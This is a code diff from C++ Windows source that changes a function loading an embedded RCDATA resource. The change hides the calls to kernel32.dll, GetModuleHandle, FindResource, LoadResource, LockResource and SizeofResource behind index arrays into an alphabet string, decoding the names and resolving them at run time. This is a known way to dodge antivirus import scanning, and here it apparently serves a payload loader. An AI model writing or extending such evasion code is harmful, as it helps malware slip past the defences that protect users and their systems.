@@ -16,12 +16,25 @@ std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  //
 }
 
 void loadkumres(const char* rssssame, char** data, DWORD* size) {
-    HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
+    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
+    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
+    int get_mod_han[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4, 26};
+    int fin_res[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4, 26};
+    int loa_res[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
+    int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
+    int siz_res[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
+    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
+    FARPROC pGetModuleHandle = GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_han, big_string, sizeof(get_mod_han)).c_str());
+    FARPROC pFindResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
+    FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
+    FARPROC pLockResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
+    FARPROC pSizeofResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
+    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
+    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);
 
-    HGLOBAL hResData = LoadResource(hModule, hResource);
-    *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(hResData);
+    HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
+    *size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
+    *data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
 }
 
 int main() {
